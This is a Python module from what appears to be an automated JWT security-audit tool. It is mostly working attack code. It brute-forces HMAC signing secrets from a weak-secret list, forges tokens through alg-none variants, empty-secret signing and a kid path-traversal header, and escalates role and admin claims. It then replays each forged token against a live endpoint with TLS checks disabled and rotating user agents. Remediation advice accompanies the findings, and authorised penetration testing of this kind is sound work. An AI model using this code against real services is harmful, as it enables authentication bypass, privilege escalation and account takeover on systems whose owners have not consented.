"""
Proxsynth - Autonomous JWT & Session Token Security Audit Suite
Performs zero-dependency decoding, algorithm-none tampering, dictionary brute-forcing
against weak secrets, claim escalation forging, and automated live replay verification.
"""

import hmac
import json
import base64
import hashlib
import urllib.parse
from typing import Dict, Any, List, Optional, Tuple

import httpx

from backend.user_agents import apply_rotating_user_agent
from backend.diff_engine import compute_semantic_diff, detect_soft_errors

# Dictionary of high-frequency weak JWT secrets
COMMON_JWT_SECRETS = [
    "secret", "password", "123456", "admin", "jwt", "key", "secretkey",
    "jwtsecret", "root", "test", "development", "private", "12345678",
    "auth", "token", "supersecret", "changeme", "default", "master",
    "1234", "qwerty", "app", "api", "guest", "welcome", "mysecret"
]


def b64url_decode(data: str) -> bytes:
    """Decodes standard or unpadded base64url strings."""
    data = data.replace("-", "+").replace("_", "/")
    padding = "=" * ((4 - len(data) % 4) % 4)
    return base64.b64decode(data + padding)


def b64url_encode(data: bytes) -> str:
    """Encodes bytes into unpadded base64url format."""
    return base64.b64encode(data).decode("utf-8").replace("+", "-").replace("/", "_").rstrip("=")


def parse_jwt(token: str) -> Dict[str, Any]:
    """Splits and decodes JWT header and payload without verifying signature."""
    parts = token.strip().split(".")
    if len(parts) < 2:
        raise ValueError("Invalid JWT format: Token must have at least header and payload.")

    header_raw = b64url_decode(parts[0])
    payload_raw = b64url_decode(parts[1])
    sig_raw = b64url_decode(parts[2]) if len(parts) > 2 and parts[2] else b""

    header = json.loads(header_raw.decode("utf-8", errors="replace"))
    payload = json.loads(payload_raw.decode("utf-8", errors="replace"))

    return {
        "header": header,
        "payload": payload,
        "signature_b64": parts[2] if len(parts) > 2 else "",
        "signature_bytes": sig_raw,
        "signing_input": f"{parts[0]}.{parts[1]}"
    }


def crack_weak_secret(token: str, wordlist: Optional[List[str]] = None) -> Optional[Tuple[str, str]]:
    """
    Attempts offline dictionary cracking against HMAC-SHA signatures (HS256, HS384, HS512).
    Returns (cracked_secret, algorithm) if cracked, else None.
    """
    parts = token.strip().split(".")
    if len(parts) < 3 or not parts[2]:
        return None

    try:
        parsed = parse_jwt(token)
    except Exception:
        return None

    signing_input = f"{parts[0]}.{parts[1]}".encode("utf-8")
    actual_sig = b64url_decode(parts[2])
    alg = (parsed.get("header", {}).get("alg") or "HS256").upper()

    hash_funcs = {
        "HS256": hashlib.sha256,
        "HS384": hashlib.sha384,
        "HS512": hashlib.sha512
    }
    hash_fn = hash_funcs.get(alg, hashlib.sha256)

    test_words = wordlist or COMMON_JWT_SECRETS
    for secret in test_words:
        calc_sig = hmac.new(secret.encode("utf-8"), signing_input, hash_fn).digest()
        if hmac.compare_digest(actual_sig, calc_sig):
            return secret, alg

    return None


def forge_jwt(
    header: Dict[str, Any],
    payload: Dict[str, Any],
    secret: Optional[str] = None,
    alg_override: Optional[str] = None
) -> str:
    """Constructs and signs (or alg-nones) a forged JWT token."""
    h = dict(header)
    p = dict(payload)

    if alg_override is not None:
        h["alg"] = alg_override

    h_bytes = json.dumps(h, separators=(",", ":")).encode("utf-8")
    p_bytes = json.dumps(p, separators=(",", ":")).encode("utf-8")
    signing_input = f"{b64url_encode(h_bytes)}.{b64url_encode(p_bytes)}"

    curr_alg = (h.get("alg") or "none").lower()

    if curr_alg == "none":
        # Stripped signature for algorithm-none attack
        return f"{signing_input}."

    secret_key = (secret or "").encode("utf-8")
    alg_upper = h.get("alg", "HS256").upper()
    if alg_upper == "HS256":
        sig = hmac.new(secret_key, signing_input.encode("utf-8"), hashlib.sha256).digest()
    elif alg_upper == "HS384":
        sig = hmac.new(secret_key, signing_input.encode("utf-8"), hashlib.sha384).digest()
    elif alg_upper == "HS512":
        sig = hmac.new(secret_key, signing_input.encode("utf-8"), hashlib.sha512).digest()
    else:
        sig = b""

    return f"{signing_input}.{b64url_encode(sig)}"


def generate_jwt_attack_variants(
    token: str,
    claims_override: Optional[Dict[str, Any]] = None,
    known_secret: Optional[str] = None
) -> List[Dict[str, Any]]:
    """
    Generates a suite of offensive JWT mutations targeting:
    - Algorithm None bypasses (lowercase, uppercase, mixed)
    - Claim tampering (role escalation, user ID tampering)
    - Empty secret signing
    - Key ID (kid) parameter manipulation
    """
    parsed = parse_jwt(token)
    header = parsed["header"]
    payload = parsed["payload"]

    escalated_payload = dict(payload)
    if claims_override:
        escalated_payload.update(claims_override)
    else:
        # Default heuristic escalation
        for role_key in ["role", "roles", "user_role", "group", "type"]:
            if role_key in escalated_payload:
                escalated_payload[role_key] = "admin"
        for bool_key in ["admin", "is_admin", "isAdmin", "is_superuser"]:
            if bool_key in escalated_payload:
                escalated_payload[bool_key] = True

    variants: List[Dict[str, Any]] = []

    # 1. Alg None Attacks (with original payload and escalated payload)
    for alg_val in ["none", "None", "NONE"]:
        variants.append({
            "vector": f"alg_none_{alg_val}",
            "description": f"Signature stripped with alg='{alg_val}'",
            "token": forge_jwt(header, payload, alg_override=alg_val)
        })
        variants.append({
            "vector": f"alg_none_escalated_{alg_val}",
            "description": f"Escalated claims with alg='{alg_val}' and stripped signature",
            "token": forge_jwt(header, escalated_payload, alg_override=alg_val)
        })

    # 2. Empty Secret HMAC Attack
    variants.append({
        "vector": "empty_secret_hmac",
        "description": "Signed using an empty string key ('')",
        "token": forge_jwt(header, escalated_payload, secret="", alg_override="HS256")
    })

    # 3. Key ID (kid) tampering
    kid_header = dict(header)
    kid_header["kid"] = "../../../../dev/null"
    variants.append({
        "vector": "kid_path_traversal_dev_null",
        "description": "Header kid pointing to /dev/null signed with empty key",
        "token": forge_jwt(kid_header, escalated_payload, secret="", alg_override="HS256")
    })

    # 4. If weak secret was cracked, include fully forged valid signature
    if known_secret:
        variants.append({
            "vector": "forged_with_cracked_secret",
            "description": f"Cryptographically valid token signed with cracked secret '{known_secret}'",
            "token": forge_jwt(header, escalated_payload, secret=known_secret)
        })

    return variants


async def audit_jwt_security(
    token: str,
    test_url: Optional[str] = None,
    method: str = "GET",
    headers: Optional[Dict[str, str]] = None,
    claims_override: Optional[Dict[str, Any]] = None,
    upstream_proxy: Optional[str] = None,
    project: str = "default",
    agent_id: str = "primary_agent"
) -> Dict[str, Any]:
    """
    Audits a JWT token against offline weaknesses and optionally conducts live
    replay attacks against a target endpoint to confirm bypass vulnerabilities.
    """
    token_clean = token.strip()
    if token_clean.lower().startswith("bearer "):
        token_clean = token_clean[7:].strip()

    try:
        parsed = parse_jwt(token_clean)
    except Exception as e:
        return {"error": f"Failed to parse JWT: {str(e)}"}

    # 1. Offline Dictionary Crack Check
    cracked = crack_weak_secret(token_clean)
    cracked_secret = cracked[0] if cracked else None

    # 2. Generate Attack Tokens
    variants = generate_jwt_attack_variants(
        token=token_clean,
        claims_override=claims_override,
        known_secret=cracked_secret
    )

    findings: List[Dict[str, Any]] = []

    if cracked_secret:
        findings.append({
            "title": "JWT Weak HMAC Secret Key Exposure",
            "severity": "CRITICAL",
            "vector": "offline_dictionary_crack",
            "evidence": f"Secret key '{cracked_secret}' successfully cracked using offline wordlist.",
            "remediation": "Generate high-entropy cryptographic secrets (at least 256-bit random) using a secure RNG."
        })

    # 3. Live Replay Verification (if test_url is supplied)
    live_replay_results: List[Dict[str, Any]] = []

    if test_url and test_url.strip():
        proxy_kwargs = {}
        if upstream_proxy and upstream_proxy.strip():
            proxy_kwargs["proxy"] = upstream_proxy.strip()
        else:
            proxy_kwargs["proxy"] = None
            proxy_kwargs["trust_env"] = False

        base_headers = dict(headers or {})
        apply_rotating_user_agent(base_headers)

        async with httpx.AsyncClient(verify=False, follow_redirects=True, timeout=12.0, **proxy_kwargs) as client:
            # Baseline authenticated request
            auth_headers = dict(base_headers)
            auth_headers["Authorization"] = f"Bearer {token_clean}"

            baseline_status = 0
            baseline_body = ""
            try:
                base_res = await client.request(method.upper(), test_url.strip(), headers=auth_headers)
                baseline_status = base_res.status_code
                baseline_body = base_res.text
            except Exception as e:
                return {
                    "token_metadata": parsed,
                    "weak_secret_cracked": cracked_secret,
                    "findings": findings,
                    "live_replay_error": f"Failed to reach test_url: {str(e)}",
                    "attack_variants": variants
                }

            # Test each attack variant
            for v in variants:
                var_headers = dict(base_headers)
                var_headers["Authorization"] = f"Bearer {v['token']}"

                try:
                    res = await client.request(method.upper(), test_url.strip(), headers=var_headers)
                    diff = compute_semantic_diff(
                        {"status_code": baseline_status, "body": baseline_body},
                        {"status_code": res.status_code, "body": res.text}
                    )

                    soft = detect_soft_errors(res.status_code, res.text)
                    is_success = 200 <= res.status_code < 300 and not soft["is_soft_403"] and not soft["is_soft_404"]

                    # Check if endpoint accepted the mutated token
                    if is_success:
                        if "alg_none" in v["vector"]:
                            findings.append({
                                "title": "JWT Signature Verification Bypass (Algorithm None Flaw)",
                                "severity": "CRITICAL",
                                "vector": v["vector"],
                                "evidence": f"Endpoint returned HTTP {res.status_code} when signature was stripped with vector '{v['vector']}'.",
                                "remediation": "Strictly enforce signature verification and explicitly whitelist HMAC/RSA algorithms; reject 'none'."
                            })
                        elif "empty_secret" in v["vector"]:
                            findings.append({
                                "title": "JWT Verification Bypass via Empty Secret Key",
                                "severity": "HIGH",
                                "vector": v["vector"],
                                "evidence": f"Endpoint returned HTTP {res.status_code} accepting token signed with empty secret.",
                                "remediation": "Verify signing key is non-null and loaded from secure configuration."
                            })

                    live_replay_results.append({
                        "vector": v["vector"],
                        "status_code": res.status_code,
                        "bypassed": is_success,
                        "similarity_to_baseline": diff["normalized_similarity_ratio"],
                        "soft_error_detected": soft["is_soft_403"] or soft["is_soft_404"]
                    })

                    try:
                        from backend.forward_proxy import _dispatch_log
                        parsed_u = urllib.parse.urlparse(test_url.strip())
                        vuln_t = "JWT Signature Verification Bypass (Algorithm None Flaw)" if is_success and "alg_none" in v["vector"] else ""
                        await _dispatch_log({
                            "project": project,
                            "agent_id": agent_id,
                            "source": "JWT_AUDIT",
                            "method": method.upper(),
                            "url": test_url.strip(),
                            "host": parsed_u.netloc,
                            "path": parsed_u.path or "/",
                            "status_code": res.status_code,
                            "duration_ms": 50,
                            "request_headers": var_headers,
                            "request_body": "",
                            "response_headers": dict(res.headers),
                            "response_body": res.text,
                            "reasoning": f"[JWT Replay Attack: {v['vector']}] {v.get('description', '')}",
                            "flag_status": "CONFIRMED" if is_success else "CLEAN",
                            "finding_title": vuln_t,
                            "finding_severity": "CRITICAL" if vuln_t else "INFO"
                        })
                    except Exception:
                        pass
                except Exception as ex:
                    live_replay_results.append({
                        "vector": v["vector"],
                        "error": str(ex)
                    })

    return {
        "token_metadata": {
            "header": parsed["header"],
            "payload": parsed["payload"]
        },
        "weak_secret_cracked": cracked_secret,
        "findings": findings,
        "attack_variants_generated": len(variants),
        "live_replay_tested": bool(test_url),
        "live_replay_results": live_replay_results
    }
